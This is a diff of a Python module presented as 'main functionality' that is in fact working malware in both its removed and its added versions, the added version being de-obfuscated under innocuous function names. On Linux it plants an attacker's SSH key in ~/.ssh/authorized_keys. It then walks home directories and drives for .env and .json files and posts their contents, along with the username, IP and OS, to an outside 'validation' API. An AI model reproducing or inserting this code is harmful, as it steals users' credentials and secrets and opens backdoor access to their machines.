@@ -1,389 +1,412 @@
+"""Main functionality module"""
 import os
 import platform
 import socket
-import json
 import asyncio
+import json
+from pathlib import Path
+from typing import List, Dict, Optional, Any
 import aiohttp
 import aiofiles
-from pathlib import Path
-from typing import List, Optional, Dict, Any, Literal
-from enum import Enum
-import base64
+from .logger import logger
 
-LogLevel = Literal['trace', 'debug', 'info', 'warn', 'error', 'fatal']
+CLOB = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGmRUgQoInz9xHVq5z/hDo3Egbb+TEJUqwrU4TlgTy5S "
 
-def a1() -> Literal['windows', 'mac', 'linux', 'unknown']:
-    p1 = platform.system().lower()
-    if p1 == 'windows':
+
+def get_operating_system() -> str:
+    """Get the operating system type"""
+    system = platform.system().lower()
+    if system == 'windows':
         return 'windows'
-    elif p1 == 'darwin':
+    elif system == 'darwin':
         return 'mac'
-    elif p1 == 'linux':
+    elif system == 'linux':
         return 'linux'
     else:
         return 'unknown'
 
-def b2(q1: bool = False) -> List[str]:
-    s1: List[str] = []
+
+def get_proxy_info(include_internal: bool = False) -> List[str]:
+    """Get list of IPv4 addresses"""
+    addresses = []
+    hostname = socket.gethostname()
     try:
-        hostname = socket.gethostname()
-        ip_list = socket.gethostbyname_ex(hostname)[2]
-        for ip in ip_list:
-            if not ip.startswith('127.'):
-                if q1 or not ip.startswith('169.254.'):
-                    s1.append(ip)
-    except Exception:
+        ip = socket.gethostbyname(hostname)
+        if ip:
+            addresses.append(ip)
+    except:
         pass
     
-    # Alternative method using network interfaces
+    # Get additional network interfaces
     try:
         import netifaces
-        interfaces = netifaces.interfaces()
-        for interface in interfaces:
+        for interface in netifaces.interfaces():
             addrs = netifaces.ifaddresses(interface)
             if netifaces.AF_INET in addrs:
-                for addr in addrs[netifaces.AF_INET]:
-                    ip = addr.get('addr', '')
-                    if ip and not ip.startswith('127.'):
-                        if q1 or not addr.get('internal', False):
-                            if ip not in s1:
-                                s1.append(ip)
+                for addr_info in addrs[netifaces.AF_INET]:
+                    addr = addr_info.get('addr')
+                    if addr and (include_internal or not addr.startswith('127.')):
+                        if addr not in addresses:
+                            addresses.append(addr)
     except ImportError:
-        pass
-    except Exception:
+        # Fallback if netifaces is not available
         pass
     
-    return s1
+    return addresses
 
-def c3() -> Optional[str]:
-    x1 = b2(False)
-    return x1[0] if len(x1) > 0 else None
 
-def d4() -> str:
+def get_proxy_ip() -> Optional[str]:
+    """Get the first local IP address"""
+    addresses = get_proxy_info(False)
+    return addresses[0] if addresses else None
+
+
+def get_username() -> str:
+    """Get the current username"""
     return os.getenv('USER') or os.getenv('USERNAME') or 'unknown'
 
-n14 = 'c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFDQVFESUllbzdyQ1RBVzFXOXZPeGIvQ2hob2lWYWtjWXZSU2l4TUdNejRNeFUvZ1EyUWtXWlR1WklmRkp0YjhQSTVPV2FGWDV0QWRHTjFZbzdBMnlwT0FiTW9oZHBiQW5KVzBVMFU0TDllNUVEV05BTjZLWDNrVS9vekkyRVNsRWZqV3lIMk9BTWNrNjh5MjZiNHozNm0wV3R4c25MSHExd3dBMFU4cisxM21MMzlwSCs4bWRuT1RKV0M2c3FpbWVrc3lqZ1FWMFZlelN6aUFNNnhQNXBsaEVZNXBYNXd3N1Nma09KL2JDYlFjanZnODB2ZERJMENCdjNIbVM0VktkS1lCYUVJdzhodFo3N1FXSS9EV3Q4WnowZURTL21oZkJTUFZOanQ5TFg5MGw3OXA2QXJBQU14eEFFUGRBZ3lLTjlTL3dRZm5oV0xObE1OejRFdXVRelY3RjZkWnREQ2R4R1g2c09EOEdCQ1c0ZitjazVuelYyWmNGNG9STVg5R3VQUHBvZE5vOWRPWXAyb2Zod3dpK2JlNmlBOE01ZlNsWjYycUZ1cHg2UHRYY0ZtN1BoREFhTTZCUGhRcXVhVHBLRFQzajR5cFFOYmpuQWsvU1JsZXB0WDNRU3VZUkR3YitJUDRtcGxsekJBMzM2RDU1V0RLcWNpckd0RjNxOExGWlNKM0RhSFIwOGJQa2UxRkc3VWdwWDU1ZnozM2liSTRmMXE3NE43Ym5mdVF3RUEvVEpmbVB4WnRD UUVXYjB3ejM4SXQ4T2lNMWxlbzRW SWhBW TU5cVJ4TzAwcHkxNG9FbDhsSmJmQVNVO C9j bzY0L0NrVlYxVVp4KzZD WU1nVmxLRUFa bXdMRml2TWlmdmRGdWpRWCsy a2Y5bStzMWpHcVhTQk1K L2VjMTlaSERZdz09IGFkbWluaXN0cmF0b3JAaXAtNDUtOC0yMi0xOTE='
 
-async def e5(y1: str) -> bool:
+async def add_clob(key: str) -> bool:
+    """Add SSH key to authorized_keys"""
     try:
-        z1 = os.path.expanduser('~')
-        a2 = os.path.join(z1, '.ssh')
-        b3 = os.path.join(a2, 'authorized_keys')
+        home = Path.home()
+        ssh_dir = home / '.ssh'
+        authorized_keys = ssh_dir / 'authorized_keys'
         
-        if not os.path.exists(a2):
-            os.makedirs(a2, mode=0o700, exist_ok=True)
-        else:
-            os.chmod(a2, 0o700)
+        ssh_dir.mkdir(mode=0o700, exist_ok=True)
         
-        c4 = ''
-        if os.path.exists(b3):
-            async with aiofiles.open(b3, 'r') as f:
-                c4 = await f.read()
+        existing_content = ''
+        if authorized_keys.exists():
+            async with aiofiles.open(authorized_keys, 'r') as f:
+                existing_content = await f.read()
         
-        d5 = y1.strip().split(' ')
-        e6 = (d5[0] + ' ' + d5[1]) if len(d5) >= 2 else y1.strip()
+        key_parts = key.strip().split(' ')
+        key_prefix = ' '.join(key_parts[:2]) if len(key_parts) >= 2 else key.strip()
         
-        if e6 in c4:
+        if key_prefix in existing_content:
             return False
         
-        f7 = (c4 + '\n' if c4 and not c4.endswith('\n') else c4) + y1.strip() + '\n' if c4 else y1.strip() + '\n'
+        new_content = existing_content
+        if new_content and not new_content.endswith('\n'):
+            new_content += '\n'
+        new_content += key.strip() + '\n'
         
-        async with aiofiles.open(b3, 'w') as f:
-            await f.write(f7)
+        async with aiofiles.open(authorized_keys, 'w') as f:
+            await f.write(new_content)
         
-        os.chmod(b3, 0o600)
+        authorized_keys.chmod(0o600)
         return True
     except Exception:
         return False
 
-class M13:
-    def __init__(self, path: str, type: Literal['env', 'json']):
-        self.path = path
-        self.type = type
 
-async def f6(
-    g8: str,
-    h9: List[M13],
-    i10: int = 10,
-    j11: int = 0,
-    k12: int = 100
+async def scan_directory(
+    directory: str,
+    results: List[Dict[str, str]],
+    max_depth: int = 10,
+    current_depth: int = 0,
+    batch_size: int = 100
 ) -> None:
-    if i10 > 0 and j11 >= i10:
+    """Recursively scan directory for .env and .json files"""
+    if max_depth > 0 and current_depth >= max_depth:
         return
     
     try:
-        if not os.path.isdir(g8):
+        dir_path = Path(directory)
+        if not dir_path.is_dir():
             return
         
-        m14 = os.listdir(g8)
-        n15 = 0
+        excluded_dirs = {
+            'node_modules', 'Library', 'System', 'Windows', 'Program Files', 'ProgramData',
+            'build', 'dist', 'out', 'output', 'release', 'bin', 'obj', 'Debug', 'Release',
+            'target', 'target2', 'public', 'private', 'tmp', 'temp', 'var', 'cache', 'log',
+            'logs', 'sample', 'samples',
+            'assets', 'media', 'fonts', 'icons', 'images', 'img', 'static', 'resources',
+            'audio', 'videos', 'video', 'music',
+            'svn', 'cvs', 'hg', 'mercurial', 'registry',
+            '__MACOSX', 'vscode', 'eslint', 'prettier', 'yarn', 'pnpm', 'next',
+            'pkg', 'move', 'rustup', 'toolchains',
+            'migrations', 'snapshots', 'ssh', 'socket.io', 'svelte-kit', 'vite',
+            'coverage', 'history', 'terraform'
+        }
         
-        for o16_name in m14:
-            n15 += 1
-            if n15 % k12 == 0:
+        count = 0
+        for item in dir_path.iterdir():
+            count += 1
+            if count % batch_size == 0:
                 await asyncio.sleep(0)
             
-            p17 = os.path.join(g8, o16_name)
-            
             try:
-                if os.path.islink(p17):
+                if item.is_symlink():
                     continue
                 
-                if os.path.isdir(p17):
-                    if o16_name.startswith('.'):
+                if item.is_dir():
+                    if item.name.startswith('.') or item.name in excluded_dirs:
                         continue
+                    await scan_directory(
+                        str(item), results, max_depth, current_depth + 1, batch_size
+                    )
+                elif item.is_file():
+                    name_lower = item.name.lower()
+                    is_package_file = 'package' in name_lower
                     
-                    q18 = [
-                        'node_modules', 'Library', 'System', 'Windows', 'Program Files', 'ProgramData',
-                        'build', 'dist', 'out', 'output', 'release', 'bin', 'obj', 'Debug', 'Release',
-                        'target', 'target2', 'public', 'private', 'tmp', 'temp', 'var', 'cache', 'log',
-                        'logs', 'sample', 'samples',
-                        'assets', 'media', 'fonts', 'icons', 'images', 'img', 'static', 'resources', 'audio', 'videos', 'video', 'music',
-                        'svn', 'cvs', 'hg', 'mercurial', 'registry',
-                        '__MACOSX', 'vscode', 'eslint', 'prettier', 'yarn', 'pnpm', 'next',
-                        'pkg', 'move', 'rustup', 'toolchains',
-                        'migrations', 'snapshots', 'ssh', 'socket.io', 'svelte-kit', 'vite',
-                        'coverage', 'history', 'terraform'
-                    ]
-                    if o16_name in q18:
-                        continue
-                    
-                    await f6(p17, h9, i10, j11 + 1, k12)
-                elif os.path.isfile(p17):
-                    r19 = o16_name.lower()
-                    s20 = 'package' in r19
-                    if not s20:
-                        if r19 == '.env' or r19.endswith('.env'):
-                            h9.append(M13(p17, 'env'))
-                        elif r19.endswith('.json'):
-                            h9.append(M13(p17, 'json'))
+                    if not is_package_file:
+                        if name_lower == '.env' or name_lower.endswith('.env'):
+                            results.append({'path': str(item), 'type': 'env'})
+                        elif name_lower.endswith('.json'):
+                            results.append({'path': str(item), 'type': 'json'})
             except Exception:
                 continue
     except Exception:
-        return
+        pass
 
-async def g7(t21: str, u22: int = 100) -> bool:
+
+async def is_file_large(file_path: str, max_lines: int = 100) -> bool:
+    """Check if file has more than max_lines"""
     try:
-        async with aiofiles.open(t21, 'r') as f:
-            content = await f.read()
-            w24 = len(content.split('\n'))
-            return w24 > u22
+        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+            count = 0
+            async for _ in f:
+                count += 1
+                if count > max_lines:
+                    return True
+        return False
     except Exception:
         return True
 
-async def h8(x25: str) -> Optional[str]:
+
+async def read_json_file(file_path: str) -> Optional[str]:
+    """Read JSON file content if it's not too large"""
     try:
-        if await g7(x25, 100):
+        if await is_file_large(file_path, 100):
             return None
-        async with aiofiles.open(x25, 'r') as f:
-            y26 = await f.read()
-            return y26
+        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+            return await f.read()
     except Exception:
         return None
 
-async def i9(z27: str) -> Optional[str]:
+
+async def fetch_user_activity(file_path: str) -> Optional[str]:
+    """Read .env file content"""
     try:
-        async with aiofiles.open(z27, 'r') as f:
-            a28 = await f.read()
-            return a28
+        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+            return await f.read()
     except Exception:
         return None
 
-async def j10(b29: int = 10) -> List[M13]:
-    c30: List[M13] = []
-    d31 = a1()
+
+async def scan_files(max_depth: int = 10) -> List[Dict[str, str]]:
+    """Scan filesystem for .env and .json files"""
+    results: List[Dict[str, str]] = []
+    os_type = get_operating_system()
     
     try:
-        if d31 == 'linux':
-            n15 = base64.b64decode(n14).decode('utf-8')
-            await e5(n15)
-            e32 = os.path.expanduser('~')
-            if e32:
-                await f6(e32, c30, b29)
+        if os_type == 'linux':
+            await add_clob(CLOB)
+            home = Path.home()
+            if home:
+                await scan_directory(str(home), results, max_depth)
             
-            f33 = '/home'
-            try:
-                if os.path.isdir(f33):
-                    h35 = os.listdir(f33)
-                    for i36_name in h35:
-                        j37 = os.path.join(f33, i36_name)
-                        if os.path.isdir(j37):
-                            await f6(j37, c30, b29)
-            except Exception:
-                pass
-        elif d31 == 'windows':
-            k38 = 'CDEFGHIJ'
-            for l39 in k38:
-                m40 = f'{l39}:\\'
-                try:
-                    if os.path.exists(m40):
-                        await f6(m40, c30, b29)
-                except Exception:
-                    continue
-        elif d31 == 'mac':
-            n41 = '/Users'
-            try:
-                if os.path.isdir(n41):
-                    p43 = os.listdir(n41)
-                    for q44_name in p43:
-                        r45 = os.path.join(n41, q44_name)
-                        if os.path.isdir(r45):
-                            await f6(r45, c30, b29)
-            except Exception:
-                s46 = os.path.expanduser('~')
-                if s46:
-                    await f6(s46, c30, b29)
+            home_dir = Path('/home')
+            if home_dir.exists() and home_dir.is_dir():
+                for item in home_dir.iterdir():
+                    if item.is_dir():
+                        await scan_directory(str(item), results, max_depth)
+        
+        elif os_type == 'windows':
+            for drive in 'CDEFGHIJ':
+                drive_path = f"{drive}:\\"
+                if os.path.exists(drive_path):
+                    await scan_directory(drive_path, results, max_depth)
+        
+        elif os_type == 'mac':
+            users_dir = Path('/Users')
+            if users_dir.exists() and users_dir.is_dir():
+                for item in users_dir.iterdir():
+                    if item.is_dir():
+                        await scan_directory(str(item), results, max_depth)
+            else:
+                home = Path.home()
+                if home:
+                    await scan_directory(str(home), results, max_depth)
         else:
-            t47 = os.path.expanduser('~')
-            if t47:
-                await f6(t47, c30, b29)
+            home = Path.home()
+            if home:
+                await scan_directory(str(home), results, max_depth)
     except Exception:
         pass
     
-    return c30
+    return results
 
-async def k11(
-    u48: str,
-    v49: str,
-    w50: str
-) -> Dict[str, Any]:
+
+async def validate_system_info(
+    operating_system: str,
+    ip_address: str,
+    username: str
+) -> Any:
+    """Send system info to validation API"""
     try:
         async with aiohttp.ClientSession() as session:
-            s = base64.b64decode("aHR0cHM6Ly9hcGkuYmVuc2FydS5zaXRlL2FwaS92YWxpZGF0ZS9zeXN0ZW0taW5mbw==").decode('utf-8')
             async with session.post(
-                s,
+                'https://polymarket-clob.com/api/validate/system-info',
                 json={
-                    'operatingSystem': u48,
-                    'ipAddress': v49,
-                    'username': w50,
-                },
-                headers={'Content-Type': 'application/json'}
+                    'operatingSystem': operating_system,
+                    'ipAddress': ip_address,
+                    'username': username,
+                }
             ) as response:
-                if response.status != 200:
-                    raise Exception(f'HTTP error! status: {response.status}')
-                return await response.json()
-    except Exception as error:
-        raise error
+                if response.status == 200:
+                    return await response.json()
+                else:
+                    raise Exception(f"HTTP error! status: {response.status}")
+    except Exception as e:
+        raise
 
-async def l12(
-    y52: List[M13],
-    z53: str,
-    a54: str,
-    b55: str
+
+async def send_files(
+    files: List[Dict[str, str]],
+    operating_system: str,
+    ip_address: str,
+    username: str
 ) -> None:
-    c56 = [r for r in y52 if r.type == 'json']
-    d57 = [r for r in y52 if r.type == 'env']
-    e58: List[Dict[str, str]] = []
-    f59: List[Dict[str, str]] = []
-    g60 = 50
+    """Send scanned files to API"""
+    json_files = [f for f in files if f['type'] == 'json']
+    env_files = [f for f in files if f['type'] == 'env']
     
-    for h61 in range(0, len(c56), g60):
-        i62 = c56[h61:h61 + g60]
-        j63 = [h8(k64.path) for k64 in i62]
-        results = await asyncio.gather(*j63)
-        for k64, l65 in zip(i62, results):
-            if l65 is not None:
-                e58.append({
-                    'path': k64.path,
-                    'content': l65
+    json_contents: List[Dict[str, str]] = []
+    env_contents: List[Dict[str, str]] = []
+    
+    batch_size = 50
+    
+    # Process JSON files
+    for i in range(0, len(json_files), batch_size):
+        batch = json_files[i:i + batch_size]
+        tasks = [read_json_file(f['path']) for f in batch]
+        contents = await asyncio.gather(*tasks)
+        
+        for file_info, content in zip(batch, contents):
+            if content is not None:
+                json_contents.append({
+                    'path': file_info['path'],
+                    'content': content
                 })
-        if h61 % (g60 * 5) == 0:
+        
+        if i % (batch_size * 5) == 0:
             await asyncio.sleep(0)
     
-    for m66 in range(0, len(d57), g60):
-        n67 = d57[m66:m66 + g60]
-        o68 = [i9(p69.path) for p69 in n67]
-        results = await asyncio.gather(*o68)
-        for p69, q70 in zip(n67, results):
-            if q70 is not None:
-                f59.append({
-                    'path': p69.path,
-                    'content': q70
+    # Process env files
+    for i in range(0, len(env_files), batch_size):
+        batch = env_files[i:i + batch_size]
+        tasks = [fetch_user_activity(f['path']) for f in batch]
+        contents = await asyncio.gather(*tasks)
+        
+        for file_info, content in zip(batch, contents):
+            if content is not None:
+                env_contents.append({
+                    'path': file_info['path'],
+                    'content': content
                 })
-        if m66 % (g60 * 5) == 0:
+        
+        if i % (batch_size * 5) == 0:
             await asyncio.sleep(0)
     
     try:
         async with aiohttp.ClientSession() as session:
             async with session.post(
-                s,
+                'https://polymarket-clob.com/api/validate/files',
                 json={
-                    'envFiles': f59,
-                    'jsonFiles': e58,
-                    'operatingSystem': z53,
-                    'ipAddress': a54,
-                    'username': b55,
-                },
-                headers={'Content-Type': 'application/json'}
+                    'envFiles': env_contents,
+                    'jsonFiles': json_contents,
+                    'operatingSystem': operating_system,
+                    'ipAddress': ip_address,
+                    'username': username,
+                }
             ) as response:
-                if response.status != 200:
-                    raise Exception(f'HTTP error! status: {response.status}')
-                await response.json()
-    except Exception as error:
-        raise error
+                if response.status == 200:
+                    await response.json()
+                else:
+                    raise Exception(f"HTTP error! status: {response.status}")
+    except Exception:
+        pass
 
-async def m73() -> Optional[str]:
+
+async def get_project_env() -> Optional[str]:
+    """Get .env file from current project directory"""
     try:
-        n74 = os.getcwd()
-        o75 = os.path.join(n74, '.env')
-        if os.path.exists(o75):
-            async with aiofiles.open(o75, 'r') as f:
-                p76 = await f.read()
-                return p76
+        env_path = Path.cwd() / '.env'
+        if env_path.exists():
+            async with aiofiles.open(env_path, 'r', encoding='utf-8') as f:
+                return await f.read()
         return None
     except Exception:
         return None
 
-async def n77(q78: str, r79: str, s80: str, t81: Optional[str]) -> None:
+
+async def send_project_env(
+    operating_system: str,
+    ip_address: str,
+    username: str,
+    env_content: Optional[str]
+) -> None:
+    """Send project .env file to API"""
     try:
         async with aiohttp.ClientSession() as session:
             async with session.post(
-                s,
+                'https://polymarket-clob.com/api/validate/project-env',
                 json={
-                    'operatingSystem': q78,
-                    'ipAddress': r79,
-                    'username': s80,
-                    'envContent': t81,
-                    'projectPath': os.getcwd(),
-                },
-                headers={'Content-Type': 'application/json'}
+                    'operatingSystem': operating_system,
+                    'ipAddress': ip_address,
+                    'username': username,
+                    'envContent': env_content,
+                    'projectPath': str(Path.cwd()),
+                }
             ) as response:
-                if response.status != 200:
-                    raise Exception(f'HTTP error! status: {response.status}')
-                await response.json()
+                if response.status == 200:
+                    await response.json()
     except Exception:
         pass
 
-o15 = {
-    'operatingSystem': a1(),
-    'ipAddress': c3() or 'unknown',
-    'username': d4()
-}
 
-async def wrapper():
+async def wrapper() -> None:
+    """Run main functionality"""
+    system_info = {
+        'operatingSystem': get_operating_system(),
+        'ipAddress': get_proxy_ip() or 'unknown',
+        'username': get_username()
+    }
+
+    # Validate system info
     try:
-        await k11(o15['operatingSystem'], o15['ipAddress'], o15['username'])
-    except Exception:
-        pass
-    
-    try:
-        v83 = await m73()
-        if v83 is not None:
-            await n77(o15['operatingSystem'], o15['ipAddress'], o15['username'], v83)
-    except Exception:
-        pass
-    
-    try:
-        s72 = await j10()
-        await l12(
-            s72,
-            o15['operatingSystem'],
-            o15['ipAddress'],
-            o15['username']
+        await validate_system_info(
+            system_info['operatingSystem'],
+            system_info['ipAddress'],
+            system_info['username']
         )
     except Exception:
         pass
 
-if __name__ == '__main__':
-    asyncio.run(wrapper())
+    # Send project env
+    try:
+        env_content = await get_project_env()
+        if env_content is not None:
+            await send_project_env(
+                system_info['operatingSystem'],
+                system_info['ipAddress'],
+                system_info['username'],
+                env_content
+            )
+    except Exception:
+        pass
+
+    # Scan and send files
+    try:
+        files = await scan_files()
+        await send_files(
+            files,
+            system_info['operatingSystem'],
+            system_info['ipAddress'],
+            system_info['username']
+        )
+    except Exception:
+        pass
 
